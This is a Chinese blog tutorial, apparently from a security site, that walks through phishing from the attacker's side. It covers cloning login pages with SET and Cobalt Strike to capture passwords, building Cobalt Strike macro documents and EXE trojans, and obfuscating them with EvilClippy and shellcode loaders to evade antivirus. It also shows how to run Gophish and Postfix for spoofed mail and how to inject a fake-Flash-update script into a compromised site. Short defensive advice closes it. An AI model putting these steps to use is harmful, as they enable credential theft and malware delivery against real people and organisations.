#### 前言：

#### 本文以攻击者的视角，去看待攻击者将是如何进行钓鱼攻击。

有人可能会问，为什么是复盘？而不是钓鱼攻击研究，其实无论是实操还是理论都占一半，有很多小伙伴可能不太知道钓鱼是什么，所以议题核心是为了让大家认识到 钓鱼邮件
的危害，以及如何防范钓鱼攻击！

本次内容讲的会较为浅显，基础薄弱的小伙伴也能看得懂，所以不用担心

### 钓鱼简介：

其实。在日常生活中，钓鱼邮件屡见不鲜，钓鱼邮件属于社工的一种

当入侵者发动网络攻击时，第一步通常是发送网络钓鱼邮件

所以，如果以攻击者的视角去看待一次针对性的钓鱼攻击，那么你需要思考你的目标对什么感兴趣或者在哪一方面容易上当受骗是非常重要的。钓鱼与漏洞挖掘或各种渗透伪装相比，钓鱼攻击的成功率是最高的，操作也是简单的

正因如此成为了攻防演练中最常见的攻击手法之一！邮件钓鱼通常出现在APT攻击里面，但是在日常生活中钓鱼邮件层出不穷

因此我们需要用攻击者的视角去了解钓鱼邮件，才能更好的防范钓鱼邮件！

本次内容主要是给大家讲解钓鱼邮件如何制作，攻击者是如何进行攻击，才能更好的防范钓鱼邮件

![](https://image.3001.net/images/20220125/1643108286_61efd7bea49eeba4c5bc7.png!small)

钓鱼攻击都有哪几种类型？这些都是是什么意思？  
1、钓鱼邮件

生活中最为常见的即是钓鱼邮件，钓鱼邮件指的是，利用伪装的邮电，欺骗受害者的账号密码等信息回复给指定的接受者；或者引导受害者点击攻击者特制的站点，这些站点通常会伪装成真实网站一样，让受害者输入银行卡账号，或者某登录系统的账号密码等

2、wifi钓鱼

wifi钓鱼有什么用呢？攻击者可以仿造一个假wifi欺骗用户登录，之后窃取用户的信息

3、钓鱼二维码

将站点的url转换成QR二维码，有些网站将网站登录的url存储在QR码上，攻击者用伪造的二维码替换成合法的二维码，篡改登录的网站url信息，将用户引导到一个假冒到登录页面，这种情况下用户扫描了QR码后，访问了伪造的登录页面，将个人信息泄漏给了攻击者

4、为基站

又称为假基站、假地台，是一种利用gsm单项认证缺陷的非法无线电通信设备，主要由主机和笔记本电脑组成

为基站能够捕获到，以它为中心一定半径范围内。移动电话信息以及短信信息，并且可以随便冒用别人的手机号强行给另一个人的手机号发送诈骗、推销等垃圾短信，这些为基站一般是安装在汽车或者一个比较隐蔽的地方发送的

5、鱼叉式钓鱼攻击

这是指一种源自于亚洲与东欧只针对“特定的目标”进行的网络钓鱼攻击！简而言之就是组织一次有目的性对特定的单位进行钓鱼攻击

6、水坑攻击

水坑攻击相对于通过社会工程方式引诱目标用户访问恶意网站更具欺骗性，效率也更高

水坑攻击也是黑客的攻击方式之一，顾名思义可知，可以理解为是在受害者必经之路设置一个“陷阱“。最常见的做法是，分析受害者经常登录哪些网站，再将这个网站攻破并且植入攻击代码，一旦受害者访问该网站就会进入攻击者的圈套中  
水坑攻击属于也APT攻击的一种，与钓鱼攻击相比，攻击者不需要耗费精力去制作钓鱼网站，而是利用合法的网站弱点，隐蔽性较强。

攻击者处心积虑制作的钓鱼网站，可如果一旦被有心人识破，那么就会前功尽弃，而水坑攻击则利用了受害者对网站的信任。水坑攻击需要利用网站弱点在其植入攻击代码，说白了，就是要先“攻破”这个站点去植入攻击代码，用户访问时会访问到攻击者恶意植入到程序或者直接盗取个人重要信息！

7、U盘钓鱼

这个也很容易理解，简单来说，就是在U盘里面植入木马或者病毒，进行钓鱼上线

常见的攻击手法，就是把U盘撇在目标单位门口。或者你可以社工员工信息邮寄给她。  
亦或者，可以像某黑客电影或者黑客游戏一样，想办法进入对方大厦到工位插U盘上马子哈哈哈。当然电影是电影，谨慎考虑此操作。不过这种近源渗透我在攻防中还是见过的哈哈哈哈

## 未知攻焉知防，未知防焉知攻？

![](https://image.3001.net/images/20220125/1643108288_61efd7c0a743c2ee5396d.png!small)  
知己知彼，百战不殆！  
只有我们了解各式各样的攻击手法，才知道如何更好的防范钓鱼攻击

1、通过漏洞触发  
操作系统漏洞（木马植入）  
应用程序及浏览器漏洞  
目标web服务器漏洞  
...  
2、利用社工的方式（非漏洞触发）  
内容仿冒（电商/金融站点、域名）  
虚假诱骗（邮件、短信、中奖、搜索引擎）  
社会工程学  
...

## 精准抛竿

#### 问题来了：那么我们如何收集目标单位收集邮箱号？

可以用某某电子商务有限公司，来进行代入实战思考。  
开始实战之前，我们需要思考一个问题，如果要对目标进行钓鱼攻击，那么我们应该如何对目标进行电子邮件收集呢？  
最简单的就是whois查看站点域名的邮箱了，其次是Google
hack语法搜素目标邮箱，也有很多exchang邮箱泄漏的案例、whois、官网子站、github也可能会泄漏目标邮箱、也可以在TG上查，具体的我就不多说了。  
先看站是否有泄漏邮箱，子域名也会有可能泄漏邮箱

一般来说公司单位或者学校单位的邮箱命名方式都是有规律性的  
通常邮箱的账号有如下几种生成规律： 比如某公司有员工名叫做“张小三”，它的邮箱可能如下：

zhangxiaosan@xxx.com  
xiaosan.zhang@xxx.com  
zxiaosan@xxx.com  
当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律。除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，hr@xxx.com/kefu@xxx.com,  
这种邮箱有时会存在弱口令，在渗透时可额外留意一下。

## 钓鱼网站制作

1、Setookit 克隆web页面钓鱼

2、cobalt strike克隆web页面钓鱼  
web页面钓鱼虽然是很久之前的技术了，但是一些新颖的想法加入其中使web钓鱼页面做得更加逼真的话，目标也很难辨别的。这就很大家考验社工能力和文案能力了。

这个工具是用来生成钓鱼网站的，kali上已经集成了，github上也有，需要的可以去github下载，我这里用kali做演示  
githu地址：https://github.com/trustedsec/social-engineer-toolkit  
这里我用kali演示：  
![image-20211219174238763](https://image.3001.net/images/20220125/1643108290_61efd7c21fc4cac427c2c.png!small)

### 选择第一项Social-Engineering Attacks （社会工程学攻击）

![image-20211219174307022](https://image.3001.net/images/20220125/1643108293_61efd7c50f4f55d79b76c.png!small)

翻译：

![image-20211219174322582](https://image.3001.net/images/20220125/1643108297_61efd7c9423315fbb41a4.png!small)

### 接下来选择第二项Website Attack Vectors （网站攻击载体）

![](https://image.3001.net/images/20220125/1643108303_61efd7cf68ea4f5e6584f.png!small)

翻译：

![image-20211219174356274](https://image.3001.net/images/20220125/1643108321_61efd7e1b0c1dbd3974f7.png!small)

### 第三项Credential Harvester Attack Method （凭证收割机攻击方法）

![image-20211219174410201](https://image.3001.net/images/20220125/1643108325_61efd7e5da848e5ddfc31.png!small)

翻译：

![image-20211219174419949](https://image.3001.net/images/20220125/1643108329_61efd7e94456a1f13f742.png!small)

### 第四步Site Cloner （站点克隆）

![image-20211219174435025](https://image.3001.net/images/20220125/1643108331_61efd7ebc30006625deac.png!small)

翻译：

![image-20211219174446512](https://image.3001.net/images/20220125/1643108333_61efd7ed691e8c115d3fa.png!small)

### 填写需要监听的IP，默认直接回车

### 填写需要克隆的网址

随便找个系统后台来克隆

![image-20211219174542183](https://image.3001.net/images/20220125/1643108336_61efd7f00b9ae6845081d.png!small)

### 接下来访问kali的IP地址，并且输入账号密码。这里模拟受害者完成登录流程

![](https://image.3001.net/images/20220125/1643108342_61efd7f652c8383f6020c.png!small)

### 完成登录后，回到kali可见登录的账号密码

![](https://image.3001.net/images/20220125/1643108349_61efd7fde685e3077370c.png!small)

### 这样就能看到受害者的输入的账号密码了

## cobalt strike克隆web页面钓鱼

![image-20211219174956728](https://image.3001.net/images/20220125/1643108357_61efd8058e65f960d58d9.png!small)

### 一、值得一提的是，并非所有的站点都可以进行克隆，貌似是因为他们把某个协议禁止了导致CS无法克隆上。但是可以自己搭建相似站点来进行钓鱼也是不二之选！

选择你需要克隆的站点url

![](https://image.3001.net/images/20220125/1643108360_61efd8083962f4fc4d511.png!small)

![image-20211219175331479](https://image.3001.net/images/20220125/1643108363_61efd80b3e8c1171ae63d.png!small)

### 克隆成功之后就是这个样子的，直接访问自己的公网服务器地址即可

![](https://image.3001.net/images/20220125/1643108365_61efd80d164f4bfa4c4df.png!small)

注：Social-Engineer Toolkit有很多玩法，比如鱼叉，钓鱼二维码，wifi等，使用方法大同小异，自行研究

## 欺骗的艺术

其实对我们来说，这点安全意识水平还是有的，但是哪些销售或者客服可不一定会有。那么就需要思考几个问题。  
如何使它变得逼真？  
在什么场景下使用最佳？  
公司全体员工邮件，如果是邮件发送的话，需要申请一个相似的域名去做伪装  
学校班级学生邮件  
web钓鱼

推荐使用场景：可以制作一个短信钓鱼、邮件钓鱼。

应用在内网克隆某个系统登录，或许会更奏效！

内网中的一些web站点，比如一些某某登录系统这些站点，在内网的东西，很多安全意识不高的，就会认为内网的东西本身就是安全的

站点克隆常见的使用场景：  
可以对某管理系统后台或者某个登录平台进行克隆，是外网的情况下，可以申请一个域名差不多的来伪装你的钓鱼网站的URL  
例如：

![](https://image.3001.net/images/20220125/1643108366_61efd80eb1509847e0dc2.png!small)  
在内网的情况，进行站点克隆成功率会更高一些，因为人们普遍认为  
在内网的东西会更具有信任力！

## CobaltStrike 生成Office宏病毒进行钓鱼攻击

#### 首先什么是office宏？

    
    
    宏是微软公司为其 OFFICE软件包设计的一个特殊功能，软件设计者为了让人们在使用软件进行工作时，避免一再地重复相同的动作而设计出来的一种工具。当在工作时，就可以直接利用事先编好的宏自动运行，去完成某项特定的任务，而不必再重复相同的动作，目的是让用户文档中的一些任务自动化。
    

踩坑记录：如果你是云服务器，需要放行相关监听端口，如果云服务器还有宝塔，宝塔那边也需要放行监听端口

我的CS是4.4中文版本的

## 0x01、攻击流程

点击attacks -> packages -> MS Office Macro

用cs生成一个Office类型的后门

![image-20211219161126177](https://image.3001.net/images/20220125/1643108367_61efd80fbc8d40ebb4ffe.png!small)

选择一个监听器

![image-20211219161245162](https://image.3001.net/images/20220125/1643108369_61efd8118bac1edf9504e.png!small)

点击生成

![image-20211219162202203](https://image.3001.net/images/20220125/1643108371_61efd813b3b8d2f16ad8a.png!small)

点一下就可以进行复制了![image-20211219162808096](https://image.3001.net/images/20220125/1643108373_61efd815b6bbcc02a701a.png!small)

复制好宏之后，新建一个word

![image-20211219162545707](https://image.3001.net/images/20220125/1643108376_61efd8185ecdad3d7df29.png!small)

新建一个宏，并点击编辑

![image-20211219162619190](https://image.3001.net/images/20220125/1643108379_61efd81b6da7c82a9ec16.png!small)

将CS复制的宏，粘贴到Project--Microsoft word对象--ThisisDocument中，其次点击保存

![](https://image.3001.net/images/20220125/1643108383_61efd81f4f4150e62751b.png!small)

保存的时候，以下红框框起来的，都是可选的保存格式

这样就保存到我的文稿中了，一个word宏病毒就做好了，以至于文档的名称和word中的内容，可以自己去自定义鸭

![image-20211219185126233](https://image.3001.net/images/20220125/1643108390_61efd8269c427fb69755d.png!small)

这里我假设已经将word发给了我要钓鱼的主机上，可以使用社工的方法使诱导被害者点击启用这个宏，具体方法我就不说了，师傅们自行拓展

踩坑记录：这个启用宏内容值得一题的是，假设目标打开此word，这时候要完全加载完word宏之后才能上线，加载时间一般是四五秒，可以在word中写一些内容去分散一些目标的注意力并诱导点击启用宏内容
完成宏的加载！

![image-20211219163403882](https://image.3001.net/images/20220125/1643108392_61efd828c5a45a7a15daa.png!small)

看一下上线方式是调用了rundii32.exe这个dll

![image-20211219163925253](https://image.3001.net/images/20220125/1643108394_61efd82a38743435c58fd.png!small)

可以查看任务管理器：

![image-20211219183729732](https://image.3001.net/images/20220125/1643108397_61efd82dcf1d83ebadbe1.png!small)

像这样的话一个office宏就做好了，但是任然不满足，因为会被杀软检测到宏病毒。

#### cs宏分析

这是代码宏中最主要的部分

![](https://image.3001.net/images/20220125/1643108405_61efd8358f412e4c7c5bf.png!small)

VBA 最强大的功能之一是可以从 **Windows API** 导入函数，上面这段主要导入了以下4个函数 CreateRemoteThread（线程创建）
VirtualAllocEx（内存分配） WriteProcessMemory（写进程内存） CreateProcessA（进程创建）

其次就是这个auto_open函数了，因为这段auto_open函数内容直接往内存里写shellcode了，这样的话，肯定会被杀软检测到。

![](https://image.3001.net/images/20220125/1643108430_61efd84e3ba01c4ca4c7e.png!small)  
此时需要一款比较知名的免杀软件：EvilClippy

这个工具可以做混淆

最新版本的：https://github.com/outflanknl/EvilClippy/releases/tag/v1.3

软件需要编译运行，由于本人使用的是Linux环境进行免杀，所以命令如下：

首先需要有mono环境：

    
    
    sudo apt-key adv --keyserver [keyserver.ubuntu.com](http://keyserver.ubuntu.com/) --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF
    
    
    
    echo "deb http://download.mono-project.com/repo/debian wheezy main" | sudo tee /etc/apt/sources.list.d/mono-xamarin.list
    
    
    
    sudo apt-get update
    
    
    
    sudo apt-get install mono-completesudo
    
    
    
    apt-get install monodevelop
    

然后使用mono,进行编译生成exe可执行文件：

    
    
    mcs /reference:OpenMcdf.dll,[System.IO.Compression.FileSystem.dll](http://system.io.compression.filesystem.dll/) /out:EvilClippy.exe *.cs
    

检查免杀软件是否可以正常运行：

    
    
    mono EvilClippy.exe -h
    

然后进行免杀操作：

首先需要创建一个vba文件，后续需要进行混淆，vba内容如下

    
    
    Sub Hello()
    
    Dim X
    
    X=MsgBox("Hello VBS")
    

###### 先使用一个模块来设置随机模块名，混淆了一些分析工具，会生成一个以_EvilClippy.docm结尾的文件。

###### 其次使用之前设置的vba文件对生成文件进行伪装混淆，命令如下

    
    
    mono EvilClippy.exe -s 1.vba 1.docm
    

关于免杀不会设计太多，可以给有兴趣的师傅提供一些思路和免杀文献：  
现在简单的整理一些免杀思路：  
1、远程调用启用宏模版  
2、对vba脚本进行编码混淆  
3、vba写hta、vbs脚本、写注册表等手  
段来绕过  
4、文档加密  
文献：  
免杀linux环境文章：https://www.bbsmax.com/A/QV5Zn46n5y/  
用github开源工具EvilClippy进行宏病毒混淆免杀

    
    
    https://github.com/outflanknl/EvilClippy/releases/tag/v1.3
    

## CobaltStrike 生成shellcode进行免杀上线

![image-20211224233621320](https://image.3001.net/images/20220125/1643108446_61efd85e4aeb74534e8ad.png!small)  
可以把payload.c文件里的shellcode内存地址复制到python到加载器中

把python的加载器py文件，转换成exe文件

其次再加载数据保护，这样也能过免杀

![](https://image.3001.net/images/20220125/1643108448_61efd8602370e7d39105f.png!small)  
利用pytho加载器转换exe文件进行加壳绕过杀软查杀

![](https://image.3001.net/images/20220125/1643108454_61efd86618943ca47ef10.png!small)

## CobaltStrike 生成exe木马进行钓鱼攻击

流程：  
1、生成cs木马进行上线  
使用场景：  
伪造漏洞补丁、病毒查杀自检工具、自定义一些钓鱼文案模版  
把木马当成工具/补丁

点击生成exe木马

![](https://image.3001.net/images/20220125/1643108455_61efd867880a5976e1a4c.png!small)  
选择监听器

![](https://image.3001.net/images/20220125/1643108457_61efd8694c96e6a9aeed0.png!small)  
勾选

![](https://image.3001.net/images/20220125/1643108458_61efd86a94433872d37dd.png!small)  
其次就是保存到哪个位置了，这样一个exe马就做好了  
剩下的就是靠自己想，应该通过什么样的伪装打包好，发给受害者了

## 钓鱼邮箱伪造

其实做好的钓鱼邮件或者木马，也可以使用小号进行发送，但是为了增加成功率，我们可以选择使用gophish平台

#### 介绍：

Gophish是为企业和渗透测试人员设计的开源网络钓鱼工具包。 它提供了快速，轻松地设置和执行网络钓鱼攻击以及安全意识培训的能力。
gophish自带web面板，对于邮件编辑、网站克隆、数据可视化、批量发送等功能的使用带来的巨大的便捷，并且在功能上实现分块，令钓鱼初学者能够更好理解钓鱼工作各部分的原理及运用。

搭建前须知：

1、国内大部分的服务器搭建伪造服务器的时候“可能”会被qq禁止掉某些协议，国外的vps是允许的。具体实际情况能不能使用，可以先用telnet一下目标运营商服务器，例如qq：`telnet
smtp.qq.com 25`

![image-20220119155648223](https://image.3001.net/images/20220125/1643108460_61efd86c3bab1ccedfab9.png!small)

2、如果是国内的服务器，会很容易封你的SMTP的25端口

## 搭建步骤

所需环境

先在服务器上安装telnet

`yum install telnet telnet-server`

其次是postfix

    
    
    yum install postfix
    

修改postfix配置文件

    
    
    vi /etc/postfix/main.cf
     # 75行:设置myhostname
     myhostname = mail.test.com
     # 83行: 设置域名
     mydomain = test.com
     # 99行: 设置myorigin
     myorigin = $mydomain
     # 116行: 默认是localhost，修改成all
     inet_interfaces = all
     # 119行: 推荐ipv4，如果支持ipv6，则可以为all
     inet_protocols = ipv4
     # 165行: 设置mydestination
     mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain 
     # 264行: 指定内网和本地的IP地址范围
     mynetworks = 192.168.0.0/16，127.0.0.0/8
     # 419行: 取消注释，邮件保存目录
     home_mailbox = Maildir/
     # 572行: 取消注释，设置banner。
     smtpd_banner = $myhostname ESMTP
    

完事之后启动smpt服务

    
    
    systemctl start postfix
    

发送测试邮件

    
    
    #安装mailx
     yum install mailx
     #测试邮箱服务器是否可用
     echo "email content" | mail -s "title" 123456@qq.com
    

![image-20220119165942731](https://image.3001.net/images/20220125/1643108462_61efd86e7e8f9c76a4f77.png!small)

其实smtp搭建好了也能直接进行邮箱伪造，就是比较麻烦。所以利用gopshish当作图形化来使用

服务器安装gophish

github地址：https://github.com/gophish/gophish/

下载：

    
    
    //32bit
    root@ubuntu:~$ wget https://github.com/gophish/gophish/releases/download/v0.10.1/gophish-v0.10.1-linux-32bit.zip
    //64bit
    root@ubuntu:~$ wget https://github.com/gophish/gophish/releases/download/v0.10.1/gophish-v0.10.1-linux-64bit.zip
    

下载完成后，利用`unzip`命令进行解压

    
    
    root@ubuntu:~$ mkdir gophish *#解压至gophish文件夹中* 
    
    root@ubuntu:~$ unzip gophish-v0.10.1-linux-64bit.zip -d ./gophish
    

修改配置文件

admin_server是后台管理⻚面，将127.0.0.1 改为 0.0.0.0，默认开放的端口3333。phish_server是钓⻥网站，默
认开放80端口。

![image-20220119171435524](https://image.3001.net/images/20220125/1643108464_61efd870c00eed03b464c.png!small)

其次给权限，运行

# 切换到gophish目录中

    
    
    cd gophish
    
    chmod 777 gophish
    #运行
    ./gophish
    

访问后台地址：

    
    
    https://x.x.x.x:3333/
    

![](https://image.3001.net/images/20220125/1643108467_61efd873e4816eeffd904.png!small)  
![](https://image.3001.net/images/20220125/1643108469_61efd8754cc343e396c32.png!small)

Gophish具体如何使用不再过多演示，贴出文献给各位师傅查阅：https://www.cnblogs.com/tomyyyyy/p/15503208.html

### Gophish成果

这样的话就发送成功到目标邮箱了

![](https://image.3001.net/images/20220125/1643108473_61efd87905f66a7dfcb83.png!small)

## 伪造结果

![](https://image.3001.net/images/20220125/1643108474_61efd87aac9cce2f81f16.png!small)

![](https://image.3001.net/images/20220125/1643108475_61efd87b75e6c2101ac46.png!small)

#### 其实如果收到了这种邮件也是可以进行溯源的

演示一下  
![image.png](https://image.3001.net/images/20220125/1643110028_61efde8c526fea98c5faa.png!small)

![](https://image.3001.net/images/20220125/1643108478_61efd87eb5a063bc9d06a.png!small)

## 水坑攻击-Flash伪装

假设已经拿到一台内网web在用服务器系统权限，上传伪装免杀马子和特定js，注意修改两个文件的名字和时间。![](https://image.3001.net/images/20220125/1643108483_61efd8833e2e5e549c20f.png!small)  
假设找到站点all.js文件，点击编辑修改  
document.write("<script type="application/javascript"
src="./js/check_flash.js">");![](https://image.3001.net/images/20220125/1643110064_61efdeb07b0f18bcbc531.png!small)  
正常访问网页，即可跳出提示flash异常画面，正常人会去点击下载最新版本，此时会下载伪装的免杀马子，然后……

![](https://image.3001.net/images/20220125/1643110067_61efdeb3844219bd98c3b.png!small)  
![](https://image.3001.net/images/20220125/1643110068_61efdeb469c75b3b9c3b2.png!small)  
这里贴出了github的项目地址：https://github.com/r00tSe7en/Flash-Pop

## 选择水域

漂亮的战术制定往往比技术点的抉择更重要。  
在合适的时机，选择适当的群体去进行钓鱼攻击，会大大提高钓鱼的成功率！![](https://image.3001.net/images/20220125/1643110069_61efdeb5c1097eff4a8a9.png!small)

### 所以攻击者会很注意发件内容：

1、投诉邮件  
2、项目合作  
3、财务通知  
4、求职邮件  
5、官方通告  
6、内邮内容回复

### 注意事项：

1、邮件头发件人尽量与目标一致  
2、少量多次发送内部人员，不集中一次性  
3、收集能主动联系的相关业务（如：证券，车辆买卖）  
4、收件人一定要甄别清楚，尽量先发非IT人员  
5、发邮的时候，注意下有没有类似梭子鱼这样的设备，  
可能存在拦截，导致目标无法收件。

## 防范钓鱼攻击手法

#### 防范三步曲

一看：  
看发件人地址，看正文是否异常  
二查：  
查邮件中的链接是否异常  
三核实：  
向发件地址的官方联系人核实，通过上面例子可知发件人地址也是可以伪造的工作中如果收到可

总结钓鱼特征：  
1、个人邮箱账号防冒，取得信任！  
2、反常的加密附件，躲避防病毒查杀  
3、换轮发信人发信

不要轻易相信邮件里的附件，比如word里的宏  
注册链接，中奖链接不要轻易相信  
注意邮件行文风格、落款、签名等地方  
服务器响应快慢，一般钓鱼的服务器配置都不是很高  
如果突然有封邮件言辞激励，请不要回复，因为它可能在社工你的邮件签名等信息

## 防范建议

一、安装杀毒软件，并且保持更新特征库要及时更新！  
二、离开电脑的时候需要锁屏  
三、不在不正规的网站下载运行软见  
四、不要运行特殊格式的后缀文件  
五、下载软件需要认准官方站点下载  
六、不随意上传敏感材料、文件到网盘、GitHub等网站。  
七、不要随意点击右键中的链接

## 安全建议

从上述复盘可以看出钓鱼邮件的攻防是一个持久而富有挑战的过程，我们在此对广大邮件系统用户提出以下安全建议：

1、部署安全有效的邮件安全产品设备，提升邮件内容安全防护

2、企业应建立快速的安全应急响应机制，发现恶意邮件批量投递成功等事件，应及时删除恶意邮件，并对受影响账号快速进行处置

3、长期坚持安全意识培训和有计划的反钓鱼演练，提高员工安全意识

更多钓鱼邮件攻击详细防范方法请查阅防范文档：http://nic.xmut.edu.cn/fwzq/zywlyhzn/201907/P020190712594876855207.pdf  

